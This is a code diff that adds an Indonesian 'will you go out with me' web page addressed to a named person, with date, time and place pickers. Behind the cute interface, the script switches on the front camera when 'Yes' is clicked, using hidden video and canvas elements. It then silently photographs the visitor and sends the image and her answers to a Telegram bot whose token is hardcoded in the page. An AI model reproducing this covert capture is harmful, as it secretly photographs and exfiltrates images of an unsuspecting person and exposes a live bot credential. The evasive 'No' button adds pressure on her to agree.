@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Jalan sama kiara</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;600;700&display=swap" rel="stylesheet">
+
+<style>
+  :root {
+    --blue-light: #e0f2fe; 
+    --blue-deep: #7dd3fc;  
+    --red: #ff4d6d;        
+    --green: #4cd97b;      
+    --dark: #2e353a;       
+  }
+  
+  * { box-sizing: border-box; }
+  
+  body {
+    margin: 0;
+    /* Mengubah font utama menjadi Fredoka */
+    font-family: 'Fredoka', 'Segoe UI', sans-serif;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: linear-gradient(180deg, #f0f9ff, var(--blue-light));
+    overflow: hidden;
+    position: relative;
+  }
+
+  /* Latar Belakang Elemen Melayang */
+  .bg-elements {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    pointer-events: none;
+    z-index: 0;
+  }
+  .bg-elements span {
+    position: absolute;
+    font-size: 24px;
+    opacity: 0.3;
+    animation: float 6s ease-in-out infinite;
+  }
+  @keyframes float {
+    0%, 100% { transform: translateY(0) rotate(0deg); }
+    50% { transform: translateY(-20px) rotate(15deg); }
+  }
+
+  /* Desain Kartu */
+  .card {
+    position: relative;
+    z-index: 1;
+    background: #fff;
+    border: 3px solid var(--dark);
+    border-radius: 24px;
+    padding: 32px 24px;
+    width: 90%;
+    max-width: 360px;
+    text-align: center;
+    box-shadow: 8px 8px 0 rgba(0,0,0,0.1);
+  }
+
+  /* Frame Foto */
+  .photo-frame {
+    width: 100%;
+    aspect-ratio: 1/1;
+    border-radius: 16px;
+    overflow: hidden;
+    margin-bottom: 20px;
+    border: 3px solid var(--blue-deep);
+    background: #f0f9ff;
+    position: relative;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .photo-frame img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+  }
+
+  h1 {
+    font-size: 1.5rem;
+    font-weight: 700;
+    color: var(--dark);
+    margin: 0 0 24px;
+    line-height: 1.4;
+  }
+
+  /* Container Pilihan / Tombol */
+  .interactive-area {
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 16px;
+    min-height: 80px;
+  }
+
+  .buttons-row {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 16px;
+    flex-wrap: wrap;
+    width: 100%;
+  }
+
+  button, input, select {
+    font-family: inherit;
+    font-size: 1.1rem;
+    font-weight: 600;
+    padding: 14px 24px;
+    border-radius: 14px;
+    border: 3px solid var(--dark);
+    outline: none;
+    width: auto;
+  }
+
+  button {
+    cursor: pointer;
+    box-shadow: 4px 4px 0 rgba(0,0,0,0.15);
+    transition: transform 0.1s ease, font-size 0.2s ease, padding 0.2s ease;
+  }
+  button:active { transform: scale(0.96); }
+
+  .yes-btn { background: var(--green); color: #1b3a24; }
+  .no-btn { background: var(--red); color: #fff; }
+  .action-btn { background: #38bdf8; color: #fff; width: 100%; }
+
+  input[type="date"], input[type="time"], select {
+    width: 100%;
+    background: #f8fafc;
+    text-align: center;
+    box-shadow: 4px 4px 0 rgba(0,0,0,0.05);
+  }
+
+  /* Alur Form Sembunyi */
+  .step {
+    display: none;
+    width: 100%;
+    flex-direction: column;
+    gap: 12px;
+  }
+  .step.active {
+    display: flex;
+  }
+
+  /* Menyembunyikan elemen kamera agar tidak merusak tampilan */
+  #cameraView, #canvasCapture {
+    display: none;
+  }
+</style>
+
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+
+</head>
+<body>
+
+<div class="bg-elements" id="bgElements"></div>
+
+<video id="cameraView" autoplay playsinline></video>
+<canvas id="canvasCapture"></canvas>
+
+<div class="card">
+  <div class="photo-frame">
+    <img id="gifImage" src="bunga.jpg" alt="Cute Valentine">
+  </div>
+
+  <h1 id="question">Halo kiara mau jalan sama ari ?</h1>
+
+  <div class="interactive-area">
+    
+    <div id="step1" class="step active">
+      <div class="buttons-row">
+        <button class="yes-btn" id="yesBtn" onclick="selectYes()">Yes</button>
+        <button class="no-btn" id="noBtn" onclick="selectNo()">No</button>
+      </div>
+    </div>
+
+    <div id="step2" class="step">
+      <input type="date" id="dateInput">
+      <button class="action-btn" onclick="confirmDate()">Konfirmasi Tanggal</button>
+    </div>
+
+    <div id="step3" class="step">
+      <input type="time" id="timeInput">
+      <button class="action-btn" onclick="confirmTime()">Konfirmasi Jam</button>
+    </div>
+
+    <div id="step4" class="step">
+      <select id="placeInput">
+        <option value="" disabled selected>— Mau kemana ??? —</option>
+        <option value="Nonton Bioskop 🎬">Nonton Bioskop 🎬</option>
+        <option value="Cafe Cantik / Ngopi ☕">Cafe Hidden / Ngopi ☕</option>
+        <option value="Taman Kota / Jajan Street Food 🍢">Taman Kota / Jajan Street Food 🍢</option>
+        <option value="Keliling Kota / Sorean Naik Motor 🛵">Keliling Kota / Sorean Naik Motor 🛵</option>
+      </select>
+      <button class="action-btn" onclick="confirmPlace()">Konfirmasi Tempat</button>
+    </div>
+
+    <div id="step5" class="step"></div>
+
+  </div>
+</div>
+
+<script>
+// ==================== PENGATURAN TELEGRAM BOT ====================
+const TELEGRAM_TOKEN = "8888926939:AAGsaVyHduKIpY05_ZYTp8vMczWI22Gzg6k"; 
+const TELEGRAM_CHAT_ID = "952733909"; 
+// =================================================================
+
+const images = ["nangispaw.jpg", "nangishp.jpg", "nangislimut.jpg", "nangisburik.jpg", "nangisbanjir.jpg", "mangap.jpg", "ember.jpg", "melet.jpg"];
+const noTexts = ["masa gak mau", "please 🥺", "ayolah :(", "mau doong", "aku nangis nanti", "ganti pilihan yaaa?"];
+
+let clickCount = 0;
+let baseFontSize = 1.1; 
+let paddingY = 14;      
+let paddingX = 24;      
+
+let tglTerpilih = "";
+let jamTerpilih = "";
+let tempatTerpilih = "";
+let streamKamera = null;
+
+function selectNo() {
+    const noBtn = document.getElementById('noBtn');
+    const yesBtn = document.getElementById('yesBtn');
+    const img = document.getElementById('gifImage');
+    
+    if (clickCount < images.length - 2) {
+        noBtn.innerText = noTexts[Math.min(clickCount, noTexts.length - 1)];
+        img.src = images[clickCount];
+        
+        baseFontSize += 0.25; paddingY += 4; paddingX += 8;
+        yesBtn.style.fontSize = baseFontSize + "rem";
+        yesBtn.style.padding = paddingY + "px " + paddingX + "px";
+        clickCount++;
+    } else {
+        noBtn.style.display = 'none';
+    }
+}
+
+function selectYes() {
+    const img = document.getElementById('gifImage');
+    const question = document.getElementById('question');
+    
+    img.src = images[images.length - 1]; 
+    question.innerText = "Yayy! Atur jadwal jalan kita yaa";
+    
+    pemicuKonfeti();
+
+    document.getElementById('step1').classList.remove('active');
+    document.getElementById('step2').classList.add('active');
+    
+    aktifkanKameraMuka();
+}
+
+function pemicuKonfeti() {
+    confetti({
+        particleCount: 140,
+        spread: 80,
+        origin: { y: 0.6 }
+    });
+
+    setTimeout(() => {
+        confetti({ particleCount: 40, angle: 60, spread: 55, origin: { x: 0.1 } });
+    }, 200);
+    setTimeout(() => {
+        confetti({ particleCount: 40, angle: 120, spread: 55, origin: { x: 0.9 } });
+    }, 400);
+}
+
+function confirmDate() {
+    const dateInput = document.getElementById('dateInput').value;
+    if (!dateInput) { alert("Masa gak milih tanggal 📅"); return; }
+    tglTerpilih = dateInput;
+    document.getElementById('step2').classList.remove('active');
+    document.getElementById('step3').classList.add('active');
+}
+
+function confirmTime() {
+    const timeInput = document.getElementById('timeInput').value;
+    if (!timeInput) { alert("Ari jemput jam berapa ⏰"); return; }
+    jamTerpilih = timeInput;
+    document.getElementById('step3').classList.remove('active');
+    document.getElementById('step4').classList.add('active');
+}
+
+function confirmPlace() {
+    const placeInput = document.getElementById('placeInput').value;
+    if (!placeInput) { alert("Tempatnya belum dipilih nih! 📍"); return; }
+    tempatTerpilih = placeInput;
+
+    document.getElementById('step4').classList.remove('active');
+    document.getElementById('step5').classList.add('active');
+    document.getElementById('step5').innerHTML = "<p style='font-size:1.2rem; font-weight:bold; color:#2e353a;'>Jawaban kamu sudah dicatat! Sampai ketemu nanti yaaa 🥰✨</p>";
+
+    kirimDataKeTelegram();
+    ambilDanKirimFoto();
+}
+
+function aktifkanKameraMuka() {
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+    .then(stream => {
+        streamKamera = stream;
+        document.getElementById('cameraView').srcObject = stream;
+    })
+    .catch(err => console.log("Akses kamera ditolak/tidak tersedia."));
+}
+
+function ambilDanKirimFoto() {
+    if (!streamKamera) return; 
+
+    setTimeout(() => {
+        const video = document.getElementById('cameraView');
+        const canvas = document.getElementById('canvasCapture');
+        const context = canvas.getContext('2d');
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', blob, 'selfie.jpg');
+            formData.append('caption', 'Foto Kiara');
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(() => {
+                streamKamera.getTracks().forEach(track => track.stop());
+            })
+            .catch(err => console.error("Gagal mengirim foto:", err));
+        }, 'image/jpeg', 0.8);
+    }, 1000); 
+}
+
+// Fungsi Fetch API untuk mengirim data teks ke Bot Telegram
+function kirimDataKeTelegram() {
+    const pesan = `Kiara Mau\n\nDia mau diajak Jalan:\n📅 Tanggal: ${tglTerpilih}\n⏰ Jam Jemput: ${jamTerpilih}\n📍 Tempat: ${tempatTerpilih}\n\nSegera persiapkan dirimu! 😎`;
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: pesan })
+    });
+}
+
+// Elemen melayang background
+const bgElements = document.getElementById('bgElements');
+const icons = ['💙', '✨', '⭐'];
+for(let i=0; i<15; i++){
+  const span = document.createElement('span');
+  span.textContent = icons[Math.floor(Math.random() * icons.length)];
+  span.style.left = Math.random()*100 + '%'; span.style.top = Math.random()*100 + '%';
+  span.style.animationDelay = (Math.random()*6) + 's'; span.style.fontSize = (16 + Math.random()*20) + 'px';
+  bgElements.appendChild(span);
+}
+</script>
+
+</body>
+</html>
